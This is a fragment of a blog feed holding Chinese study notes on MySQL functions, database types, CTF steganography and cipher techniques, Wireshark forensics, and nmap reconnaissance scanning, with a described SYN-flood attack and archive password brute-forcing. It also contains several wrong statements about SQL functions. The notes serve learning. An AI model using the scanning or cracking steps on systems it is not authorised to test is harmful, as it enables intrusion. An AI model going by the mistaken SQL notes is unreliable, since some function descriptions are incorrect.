href="#rpad" class="headerlink" title="rpad"></a>rpad</h2><ol><li>用指定字符实现右填充</li><li>参数：待填充字符串，填充后长度，用于填充的字符串</li></ol><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><ol><li>SELECT REPLACE(‘abcdefabcdef’,’a’,’b’) AS out_put</li><li>将字符串中的所有a和b都删去</li><li>参数：待删除字符串，后面都是需要删除的字符</li></ol><h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><ol><li>数学函数的第二位都是小数点后保留几位<h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3></li><li>四舍五入</li><li>SELECT ROUND(x,y)</li><li>将x绝对值四舍五入，后删去正负号</li><li>y是保留小数点后的位数</li></ol><h3 id="ceil"><a href="#ceil" class="headerlink" title="ceil"></a>ceil</h3><ol><li>向上取整</li><li>返回大于等于该参数的最小整数</li></ol><h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><ol><li>向下取整</li><li>返回小于等于该参数的最大整数</li></ol><h2 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h2><ol><li>截断,无论后面是什么，都会四舍五入</li><li>SELECT TRUNCATE(1.69999,1) AS out_put:返回1.6</li></ol><h2 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h2><ol><li>SELECT MOD(10,3);</li><li>相当于SELECT 10 % 3;</li><li>被除数如果为正，则结果为正，否则为负</li><li>a-a/b*b   (除数一定返回的是整数，即被整除的值)</li></ol><h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><h3 id="now"><a href="#now" class="headerlink" title="now"></a>now</h3><ol><li>用于返回系统日期+时间</li></ol><h3 id="curdate"><a href="#curdate" class="headerlink" title="curdate"></a>curdate</h3><ol><li>用于返回系统日期，没有时间</li><li>与now的区别在于没有时间</li></ol><h3 id="curtime"><a href="#curtime" class="headerlink" title="curtime"></a>curtime</h3><ol><li>用于返回系统时间，不包含系统日期</li></ol><h3 id="可以获取指定部分，年，月，日，小时，分钟，秒"><a href="#可以获取指定部分，年，月，日，小时，分钟，秒" class="headerlink" title="可以获取指定部分，年，月，日，小时，分钟，秒"></a>可以获取指定部分，年，月，日，小时，分钟，秒</h3><ol><li>SELECT YEAR(NOW()) 年；</li><li>出现英文需要在函数后面加MONTH</li><li>SELECT MONTHNAME(NOW()) 年；</li></ol><h3 id="str-to-date-将日期格式的字符转换成指定格式的日期"><a href="#str-to-date-将日期格式的字符转换成指定格式的日期" class="headerlink" title="str_to_date:将日期格式的字符转换成指定格式的日期"></a>str_to_date:将日期格式的字符转换成指定格式的日期</h3><ol><li>STR_TO_DATE(‘7-29-2003’,’%Y-%m-%d’) 2003-07-29:</li><li>月份将转为两位</li><li><img src="https://s4.ax1x.com/2022/02/12/H0kaCt.png"></li><li>SELECT * FROM employees WHERE hiredate = STR_TO_DATE(‘4-3-1992’,’%c-%d %Y’)</li></ol><h3 id="date-format-将日期转换成字符"><a href="#date-format-将日期转换成字符" class="headerlink" title="date_format:将日期转换成字符"></a>date_format:将日期转换成字符</h3><ol><li>DATE_FORMAT(‘2003-07-29’,’%Y年%m月%d日’) 将返回2003年07月29日</li></ol><h2 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h2><ol><li>SELECT VERSION();版本号</li><li>SELECT DATABASES();查看数据库（注意有s表示复数）</li><li>SELECT USER();查看用户</li></ol><h2 id="流程控制函数"><a href="#流程控制函数" class="headerlink" title="流程控制函数"></a>流程控制函数</h2><h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><ol><li>if(exp1,exp2,exp3)</li><li>exp1是条件表达式，true or false</li><li>如果为true，则返回exp2的值</li><li>如果为false，则返回exp3的值</li><li>和py中的倒装句类似 （正确 if 条件 else 错误）</li></ol><h3 id="case函数"><a href="#case函数" class="headerlink" title="case函数"></a>case函数</h3><ol><li>case 要判断的字段或表达式</li><li>when 常量1 then 要显示的值1或语句1</li><li>when 常量2 then 要显示的值2或语句2</li><li>else 要显示的值n或语句n</li><li>end</li></ol><h4 id="等值判断"><a href="#等值判断" class="headerlink" title="等值判断"></a>等值判断</h4><ol><li>select salary 原始工资，departmant_id,</li><li>CASE department_id</li><li>WHEN 30 THEN salary*1.1</li><li>WHEN 40 THEN salary*1.2</li><li>WHEN 50 THEN salary*1.3</li><li>ELSE salary</li><li>END AS 新工资</li><li>FROM employees;</li></ol><h5 id="多重if判断区间"><a href="#多重if判断区间" class="headerlink" title="多重if判断区间"></a>多重if判断区间</h5><ol><li>SELECT salary</li><li>CASE</li><li>WHEN salary&gt;2 THEN ‘A’</li><li>WHEN salary&gt;1 THEN ‘B’</li><li>ELSE ‘D’</li><li>END AS 工资级别</li><li>FROM employees;</li></ol><h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h1><h2 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h2><h2 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h2><h2 id="max"><a href="#max" class="headerlink" title="max"></a>max</h2><h2 id="min"><a href="#min" class="headerlink" title="min"></a>min</h2><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库种类</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h1><h2 id="数据库是什么"><a href="#数据库是什么" class="headerlink" title="数据库是什么"></a>数据库是什么</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>将大量数据保存起来，通过计算机加工而成的可以进行高效访问的数据集合（database）</li><li>随时调用<h3 id="网状数据库"><a href="#网状数据库" class="headerlink" title="网状数据库"></a>网状数据库</h3></li><li>将数据从应用程序中独立出来进行集中管理（IDS）</li><li>层和层之间有联系<h3 id="层次数据库"><a href="#层次数据库" class="headerlink" title="层次数据库"></a>层次数据库</h3></li><li>层和层之间没有联系</li><li>使用树结构来描述实体和其之间关系的数据模型（IMS information management system）<h3 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h3></li><li>和excel表格一样，由行和列组成的二维表格来管理数据</li><li>使用SQL（structured query language,结构化查询语言）</li><li>可以处理表格数据但是不能很好的处理文本，图像，视频等</li><li>缺点：文件类型单一，只有表格的文档类型<h3 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h3></li><li>增加机器的数量，把数据库同时部署再多台机器上<h3 id="Nosql数据库"><a href="#Nosql数据库" class="headerlink" title="Nosql数据库"></a>Nosql数据库</h3></li><li>为了解决大规模数据集合和多种数据种类带来的挑战，Nosql应运而生</li><li>灵活的数据模型，高拓展性，高可用性，但是不支持SQL查询</li><li>主要包括：文档数据库，列簇式数据库，键值数据库，图 数据库</li><li>HBase，MongoDB</li><li>缺点：不支持高度结构化查询，不能体哦概念股ACID（原子性，一致性，隔离性，持久性）<h3 id="NewSQL数据库"><a href="#NewSQL数据库" class="headerlink" title="NewSQL数据库"></a>NewSQL数据库</h3></li><li>对各种新的可拓展/高性能数据库的简称，不仅具有Nosql对海量数据的存储管理能力，还保持了ACID和SQL等性能<h3 id="云数据库"><a href="#云数据库" class="headerlink" title="云数据库"></a>云数据库</h3></li><li>将传统的数据库系统配置到云上，由专门的云服务提供商进行云上数据库系统的管理和部署工作</li><li>通过计算存储分离，存储在线扩容，计算弹性伸缩来提升数据库的可用性和可靠性<h2 id="数据库管理系统-DBMS"><a href="#数据库管理系统-DBMS" class="headerlink" title="数据库管理系统 DBMS"></a>数据库管理系统 DBMS</h2></li></ol><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ol><li>在命令窗口链接（需要设置环境变量）<br>mysql -u root -p<br>mysql -h IP -u 用户名 -p</li><li>workbench链接</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF杂项1</title>
      <link href="/CTF%E6%9D%82%E9%A1%B91/"/>
      <url>/CTF%E6%9D%82%E9%A1%B91/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF杂项1"><a href="#CTF杂项1" class="headerlink" title="CTF杂项1"></a>CTF杂项1</h1><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="载体"><a href="#载体" class="headerlink" title="载体"></a>载体</h3><ol><li>图片</li><li>音频</li><li>视频</li><li>压缩包<h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2></li><li>颜色差别(LSB隐写)</li><li>gif多帧隐藏</li><li>exif信息隐藏（藏在图片的exif信息中）</li><li>图片修复<h3 id="LSB最低有效位隐写"><a href="#LSB最低有效位隐写" class="headerlink" title="LSB最低有效位隐写"></a>LSB最低有效位隐写</h3></li><li>利用RGB</li><li>红色十进制为255，二进制为1111，1111（8个1）</li><li>通过修改像素最低位的1bit来达到隐藏的效果</li><li>工具：stegsolve</li><li>点击左右查看不同色位的信息<h3 id="图像隐写-1"><a href="#图像隐写-1" class="headerlink" title="图像隐写"></a>图像隐写</h3></li><li>信息隐藏在动态图中</li><li>stegsolve中框架浏览器frame brouser<h3 id="Exif信息隐写"><a href="#Exif信息隐写" class="headerlink" title="Exif信息隐写"></a>Exif信息隐写</h3></li><li>照片中的EXIF属性可以保存大量的信息</li><li>windows右击查看图像属性<h3 id="图像修复"><a href="#图像修复" class="headerlink" title="图像修复"></a>图像修复</h3><h4 id="图像类型"><a href="#图像类型" class="headerlink" title="图像类型"></a>图像类型</h4></li><li>jpeg/jpg 文件头：（2byte）FF D8 文件结束：（2byte）FF D9</li><li>png(8byte):89 50 4E 47 0D 0A 1A 0A</li><li>gif(6byte):47 49 46 38 39(37) 61</li><li>BMP(2byte):42 4D</li><li>参考博客<a href="https://www.cnblogs.com/senior-engineer/p/9541719.html">https://www.cnblogs.com/senior-engineer/p/9541719.html</a></li><li>常用类型博客参考<a href="https://blog.csdn.net/xiaolong22333/article/details/107498232">https://blog.csdn.net/xiaolong22333/article/details/107498232</a><h4 id="修改图片大小"><a href="#修改图片大小" class="headerlink" title="修改图片大小"></a>修改图片大小</h4></li><li>第二行的前四位是宽，后四位是高<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3></li><li>winhex修复文件头<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3></li><li>信息隐藏在声音里（逆序）</li><li>信息隐藏在数据里<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3></li><li>Adoube Audition<h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4></li><li>拉到Adobe Audition里面是下面这个样子。我们可以手动比照上面那个表格得到数字，也可以用dtmf2num.exe自动解码。</li><li>MP3Stego<h4 id="Decode-exe-X-文件名-P-密码"><a href="#Decode-exe-X-文件名-P-密码" class="headerlink" title="Decode.exe -X 文件名 -P 密码"></a>Decode.exe -X 文件名 -P 密码</h4></li><li>-X后面是隐藏的东西 -P后面写密码</li><li>****1.开始-&gt;运行-&gt;CMD</li><li>进入某个磁盘，直接盘符代号：如D：，不用CD 命令切换</li><li>进入除根录以下的文件夹 cd 文件夹路径 例如我要进入 E:/Program Files/PHP 就<br>输入 E：回车<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4></li><li>将没有隐藏信息的部分删掉</li><li>若有莫斯电码信息，则减弱左声道，加强右声道或倒过来<h3 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h3></li><li>信息一女昂在视频的某个或多个帧中</li><li>Premiere<h3 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h3></li><li>文件拼接</li><li>简单的可以直接使用Windows下的文件拼接命令copy /b 1.jpg+2.zip output.jpg<h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4></li><li>binwalk</li><li>dd</li><li>winhex</li></ol><h1 id="md5解密网站"><a href="#md5解密网站" class="headerlink" title="md5解密网站"></a>md5解密网站</h1><ol><li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li><li>MD5算法特点：</li><li>压缩性：任意长度的数据，算出的MD5值长度都是固定的</li><li>容易计算，从原数据计算出的MD5值很容易<h1 id="base64解密网站"><a href="#base64解密网站" class="headerlink" title="base64解密网站"></a>base64解密网站</h1></li><li><a href="https://the-x.cn/base64">https://the-x.cn/base64</a></li><li>这个网站对格式要求不是很高，且能够报错</li></ol><h1 id="密码学及编码"><a href="#密码学及编码" class="headerlink" title="密码学及编码"></a>密码学及编码</h1><ol><li>古典密码可以分为置换密码和替换密码<h2 id="位移密码"><a href="#位移密码" class="headerlink" title="位移密码"></a>位移密码</h2></li><li>凯撒密码</li><li>每一个字母顺序移动几个位置，key值即为偏移量<h2 id="解密方法（对key值进行解密）"><a href="#解密方法（对key值进行解密）" class="headerlink" title="解密方法（对key值进行解密）"></a>解密方法（对key值进行解密）</h2></li><li>手动解密</li><li>在线工具</li><li>python中的pycipher模块</li><li>from pycipher import Caesar</li><li>Caesar(key=设置).encipher(“待引入”)<h3 id="特殊形式ROT13"><a href="#特殊形式ROT13" class="headerlink" title="特殊形式ROT13"></a>特殊形式ROT13</h3></li><li>相当于凯撒加密的key=13</li><li>加密和解密是一个循环</li><li>一共26个英文字母，相当于是跑了一边英文字母<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2></li><li>一维的加密(分组密码)</li><li>栏数必须为密文长度的约数，明文长度与密文长度相同<h2 id="弗吉尼亚密码"><a href="#弗吉尼亚密码" class="headerlink" title="弗吉尼亚密码"></a>弗吉尼亚密码</h2></li><li>二维的加密<h3 id="工具：在线解密，脚本"><a href="#工具：在线解密，脚本" class="headerlink" title="工具：在线解密，脚本"></a>工具：在线解密，脚本</h3></li><li>输入明文</li><li>输入密钥<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2></li><li>加密和解密使用相同密钥</li><li>DES，3DES，AES</li><li>使用在线工具进行解密<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2></li><li>如果使用公钥进行加密，则用对应的私钥才能解密</li><li>如果使用私钥，则需要使用公钥</li><li>RSA,Elgamal,背包算法，Rabin,D-H,ECC<h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2></li><li>直线和点组成的图形</li><li><a href="https://imgtu.com/i/qMyOud"><img src="https://s1.ax1x.com/2022/03/22/qMyOud.png" alt="qMyOud.png"></a><h2 id="培根密码：由a和b构成的替换密码"><a href="#培根密码：由a和b构成的替换密码" class="headerlink" title="培根密码：由a和b构成的替换密码"></a>培根密码：由a和b构成的替换密码</h2></li><li>可以将a理解为0</li><li>b理解为1</li><li><a href="https://imgtu.com/i/qM6K8U"><img src="https://s1.ax1x.com/2022/03/22/qM6K8U.png" alt="qM6K8U.png"></a><h2 id="键盘密码：电脑键盘位置连线画出图案"><a href="#键盘密码：电脑键盘位置连线画出图案" class="headerlink" title="键盘密码：电脑键盘位置连线画出图案"></a>键盘密码：电脑键盘位置连线画出图案</h2></li><li>连线得到的是字母图案<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2></li><li>通过密钥和密文可以还原原始信息<h2 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h2></li><li>将数据转化成某种固定的格式的编码信息，方便不同系统之间的传输<h2 id="散列："><a href="#散列：" class="headerlink" title="散列："></a>散列：</h2></li><li>哈希值，验证完整性，不能解码<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3></li><li>莫斯电码，HTML编码，二维码也算是编码</li><li>base64编码文本末尾输出字符使用=，所以编码后输出的文本末尾可能会出现一个或两个=</li></ol><h1 id="解码网站汇总"><a href="#解码网站汇总" class="headerlink" title="解码网站汇总"></a>解码网站汇总</h1><ol><li><a href="https://daimajiaoliu.com/daima/8c7941818c4d408">https://daimajiaoliu.com/daima/8c7941818c4d408</a></li></ol><h1 id="各种编码特点"><a href="#各种编码特点" class="headerlink" title="各种编码特点"></a>各种编码特点</h1><ol><li>参考博客：<a href="https://cloud.tencent.com/developer/article/1748394">https://cloud.tencent.com/developer/article/1748394</a></li><li>1、MD5——示例21232F297A57A5A743894A0E4A801FC3<br>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。</li><li>2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997<br>这种加密的密文特征跟MD5差不多，只不过位数是40</li><li>1、Base64——示例YWRtaW4tcm9vdA==<br>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li><li>2、Base58——示例6tmHCZvhgfNjQu<br>它最大的特点是没有等号</li><li>3、Base32——示例GEZDGNBVGY3TQOJQGE======<br>他的特点是明文超过十个后面就会有很多等号</li><li>4、Base16——示例61646D696E<br>它的特点是没有等号并且数字要多于字母</li><li>5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#<br>特点是奇怪的字符比较多，但是很难出现等号</li><li>6、Base100——示例:emoji<br>特点就是一堆Emoji表情<h1 id="各种密码特点"><a href="#各种密码特点" class="headerlink" title="各种密码特点"></a>各种密码特点</h1></li><li>1、凯撒密码——示例iodj{khoor_zrug_123}<br>只对字母进行加密，常用于CTF比赛中</li><li>2、维吉尼亚密码——示例fmcg{iglmq_wptd_123}<br>可以说是凯撒密码的加强版，引入了密钥</li></ol><h1 id="隐写术工具"><a href="#隐写术工具" class="headerlink" title="隐写术工具"></a>隐写术工具</h1><h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><ol><li>图片隐写术</li><li>扫出二维码可以用手机qq，微信，cortexscan</li><li>也可以逐帧分析gif，点击frame browser进入帧预览功能<h2 id="winhex-010editor-导出或导入16进制处理txt形式的文件"><a href="#winhex-010editor-导出或导入16进制处理txt形式的文件" class="headerlink" title="winhex/010editor(导出或导入16进制处理txt形式的文件)"></a>winhex/010editor(导出或导入16进制处理txt形式的文件)</h2><h2 id="photoshop（图形拼接）"><a href="#photoshop（图形拼接）" class="headerlink" title="photoshop（图形拼接）"></a>photoshop（图形拼接）</h2></li><li>矩形选框功能选出条形码</li><li>ctrl+c进行复制</li><li>右下角创建图层</li><li>使用选择工具移动<h2 id="Adobe-Auditon"><a href="#Adobe-Auditon" class="headerlink" title="Adobe Auditon"></a>Adobe Auditon</h2></li><li>右侧的L和R分别代表左右声道，可以打开或关闭左右声道</li><li>上方的hms一栏中可以增大音符<h2 id="搜索加解密工具"><a href="#搜索加解密工具" class="headerlink" title="搜索加解密工具"></a>搜索加解密工具</h2><h2 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h2></li><li>最上方一栏decoder可以实现编码和解码</li><li>encode实现加密（选择编码方式）</li><li>decode实现解密（选择解码方式）<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2></li><li>先cat一下看看里面有什么</li><li>检测隐写的东西里面有什么</li><li>binwalk 文件（命令），即可检测出里面有什么东西<h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2></li><li>foremost 文件名（命令），即可分离出里面隐藏的东西</li></ol><h1 id="CTF取证技术"><a href="#CTF取证技术" class="headerlink" title="CTF取证技术"></a>CTF取证技术</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ol><li>点击右侧表达式，使用wireshark内在表达式进行过滤</li><li>筛选协议：http,ftp等</li><li>ip.addr == 192.168.1.1</li><li>也可以使用表达式中的逻辑运算符进行运算<h4 id="追踪流"><a href="#追踪流" class="headerlink" title="追踪流"></a>追踪流</h4></li><li>右击追踪流</li><li>选择TCP/UDP/SSL/HTTP</li><li>弹出的窗口中选择查找下一个<h4 id="文件导出"><a href="#文件导出" class="headerlink" title="文件导出"></a>文件导出</h4></li><li>Export Objects,选择不同类型</li></ol><h5 id="被偷走的文件和秘密文件"><a href="#被偷走的文件和秘密文件" class="headerlink" title="被偷走的文件和秘密文件"></a>被偷走的文件和秘密文件</h5><ol><li>题目给出入侵时的秘密文件，分析ftp流量包</li><li>追踪流</li><li>发现有rar文件，使用binwalk -e进行分离</li><li>分离出rar文件，使用ARCHPR进行爆破，得到flag</li></ol><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><ol><li>点击上方筛选</li><li>查看所有upload中hack.php信息</li><li>右击，选择follow，追踪http流</li></ol><h3 id="四种流"><a href="#四种流" class="headerlink" title="四种流"></a>四种流</h3><ol><li>GET用来获取资源，只是获取，查询数据，不会修改服务器的数据</li><li>POST可以向服务器发送修改请求，进行数据的修改。</li></ol><h3 id="不同文件类型的文件头"><a href="#不同文件类型的文件头" class="headerlink" title="不同文件类型的文件头"></a>不同文件类型的文件头</h3><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><h3 id="即日志分析"><a href="#即日志分析" class="headerlink" title="即日志分析"></a>即日志分析</h3><p>访问IP+访问时间+访问方式+访问路径+访问版本+响应</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器系统</title>
      <link href="/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h1><h2 id="即服务器的操作系统"><a href="#即服务器的操作系统" class="headerlink" title="即服务器的操作系统"></a>即服务器的操作系统</h2><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="windows-server"><a href="#windows-server" class="headerlink" title="windows server"></a>windows server</h3><ol><li><p>对存储装置管控更安全</p></li><li><p>不提供32位版本</p><h3 id="netware"><a href="#netware" class="headerlink" title="netware"></a>netware</h3></li><li><p>以文件服务器为中心，主要由三部分组成：文件服务器内核，工作站外壳，低层通信协议</p><h3 id="unix"><a href="#unix" class="headerlink" title="unix"></a>unix</h3></li><li><p>多用户，多任务的分时操作系统</p></li><li><p>结构：操作系统内核，系统调用，应用程序</p></li><li><p>功能强大的可编程的Shell语言(外壳语言);</p></li><li><p>采用树状目录结构，具有良好的安全性，保密性和可维护性;</p></li><li><p>采用进程对换(Swapping)的内存管理机制和请求调页的存储方式，实现虚拟内存管理，内存的使用效率大增;</p></li><li><p>多种通信机制，如：管道通信，软中断通信，消息通信，共享存储器通信，信号灯通信。</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3></li><li><p>类unix操作系统，多用户，多任务，支持多线程和多CPU的操作系统</p></li><li><p>思想：一切都是文件，每个软件都有确定的用途</p></li><li><p>多用户，多任务：各个用户对于自己的文件设备有自己特殊的权利；多个程序可以同时并独立的运行</p></li><li><p>同时字符界面和图形界面</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集下</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8B/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集下"><a href="#信息收集下" class="headerlink" title="信息收集下"></a>信息收集下</h1><h2 id="操作方向"><a href="#操作方向" class="headerlink" title="操作方向"></a>操作方向</h2><ol><li>域名信息</li><li>whois信息</li><li>目录信息</li><li>谷歌hacker</li><li>整站分析</li><li>旁站c端</li><li>后台查找</li><li>cdn绕过</li><li>app</li><li>host.txt<h2 id="自动跑漏洞工具"><a href="#自动跑漏洞工具" class="headerlink" title="自动跑漏洞工具"></a>自动跑漏洞工具</h2><h3 id="Nmap端口扫描王"><a href="#Nmap端口扫描王" class="headerlink" title="Nmap端口扫描王"></a>Nmap端口扫描王</h3><h4 id="主机探测（看哪些主机IP在线）（up-down）"><a href="#主机探测（看哪些主机IP在线）（up-down）" class="headerlink" title="主机探测（看哪些主机IP在线）（up/down）"></a>主机探测（看哪些主机IP在线）（up/down）</h4>（以下步骤的前提是切换到nmap的目录下能够找到nmap.exe）</li><li>扫描单个主机 nmap.exe 192.168.1.2</li><li>扫描整个子网 nmap.exe 192.168.1.1/24</li><li>扫描多个目标 nmap.exe IP1 IP2</li><li>扫描一个范围内的目标 nmap.exe 192.168.1.1-100(扫描1到100的所有主机)<h4 id="查看扫描的所有主机的列表（加参数-sL）"><a href="#查看扫描的所有主机的列表（加参数-sL）" class="headerlink" title="查看扫描的所有主机的列表（加参数-sL）"></a>查看扫描的所有主机的列表（加参数-sL）</h4></li><li>nmap -sL 192.168.1.1/24<h4 id="扫描除过某一个IP外的所有子网主机"><a href="#扫描除过某一个IP外的所有子网主机" class="headerlink" title="扫描除过某一个IP外的所有子网主机"></a>扫描除过某一个IP外的所有子网主机</h4></li><li>nmapxxx-excludexx****</li><li>include和exclude<h4 id="扫描除过某一个文件中的IP外的子网主机命令"><a href="#扫描除过某一个文件中的IP外的子网主机命令" class="headerlink" title="扫描除过某一个文件中的IP外的子网主机命令"></a>扫描除过某一个文件中的IP外的子网主机命令</h4></li><li>nmapxxx-excludefilexxx.txt(会先读取xxx.file中的IP，然后排除)<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3></li><li>nmap -F -sT -v IP</li><li>-F:扫描100个最有可能开放的端口</li><li>-v 获取扫描的信息</li><li>-sT:采用的是TCP扫描，不写也可，默认为TCP扫描</li><li>-p指定扫描的端口<h3 id="zenmap是可视化界面"><a href="#zenmap是可视化界面" class="headerlink" title="zenmap是可视化界面"></a>zenmap是可视化界面</h3></li><li>可以直接输入域名进行扫描<h2 id="端口扫描状态"><a href="#端口扫描状态" class="headerlink" title="端口扫描状态"></a>端口扫描状态</h2></li><li>open 端口开启，数据有到达主机，有程序在端口上监控</li><li>closed 端口关闭，数据有到达主机，没有程序在端口上监控</li><li>filtered 数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤</li><li>unfiltered 数据有到达主机，但是不能识别端口的当前状态</li><li><img src="D:\CTF学习工具\QQ截图.png"><h2 id="服务版本扫描"><a href="#服务版本扫描" class="headerlink" title="服务版本扫描"></a>服务版本扫描</h2><h2 id="主机系统的指纹识别"><a href="#主机系统的指纹识别" class="headerlink" title="主机系统的指纹识别"></a>主机系统的指纹识别</h2><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h2 id="创建扫描版本"><a href="#创建扫描版本" class="headerlink" title="创建扫描版本"></a>创建扫描版本</h2><h2 id="burpsuite手工测"><a href="#burpsuite手工测" class="headerlink" title="burpsuite手工测"></a>burpsuite手工测</h2><h2 id="TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP"><a href="#TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP" class="headerlink" title="TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)"></a>TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3></li><li>客户端向服务端发送请求</li><li>服务端向客户端发送响应包</li><li>客户端向服务端发送确认相应包</li><li>如果客户端已知不发送，服务端会等待（看服务端的设置状态，例如：等待n秒）<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3></li><li>当黑客手里握着的主机同时向服务端发送请求时，如果超过服务器能够承受的量，且黑客一直在第三次握手的时候不发送确认包，则会令服务端一直等待，严重的导致拒绝服务<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3></li><li>扫描速度快，准确性高，对操作者没有权限上的要求</li><li>但是容易被防火墙和IDS防入侵系统发现<h2 id="SYN扫描-sS（s表明扫描方式-S表明SYN扫描）"><a href="#SYN扫描-sS（s表明扫描方式-S表明SYN扫描）" class="headerlink" title="SYN扫描 -sS（s表明扫描方式,S表明SYN扫描）"></a>SYN扫描 